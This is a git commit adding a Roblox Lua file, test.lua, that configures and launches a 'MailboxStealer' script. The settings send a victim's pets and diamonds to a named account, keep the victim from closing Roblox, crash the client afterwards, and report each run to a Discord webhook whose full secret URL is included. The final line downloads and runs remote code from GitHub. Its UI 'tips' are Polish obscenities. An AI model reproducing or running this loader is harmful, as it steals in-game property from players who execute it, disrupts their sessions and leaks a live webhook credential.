665310932962295c2de47f3843e25bd7f73915bb
HerrSimoNHub <130193268+HerrSimoNHub@users.noreply.github.com>
2023-04-08 03:07:04 +0200

    Create test.lua

---
+++ test.lua
@@ -0,0 +1,21 @@
+--[[ Main Config ]]--
+_G.Username = "HerrySzymoN" --// Username To Send Pets To
+_G.GiftMessage = "SimonHub" --// Message For The Gift To Say
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+
+--[[ Webhook Config ]]--
+_G.Enabled = true --// Toggle For Sending Webhooks
+_G.Mention = false --// Pings You When Someone Executes
+_G.Webhook = "https://discord.com/api/webhooks/1093827767948288050/rx_kEjRnxLTNUmSrZgME13mMRdLPaeXyFjdhnCgArlXA-ASK9jo6ifUQUgo6iSXL_JBN" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+_G.ScriptName = "test" --// Script Name On The UI
+_G.Tip1 = "jebac" --// Gives You Tips On The UI
+_G.Tip2 = "twoja" --// Gives You Tips On The UI
+_G.Tip3 = "matke" --// Gives You Tips On The UI
+_G.Tip4 = "psie" --// Gives You Tips On The UI
+_G.Tip5 = "jebany" --// Gives You Tips On The UI
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua"))()
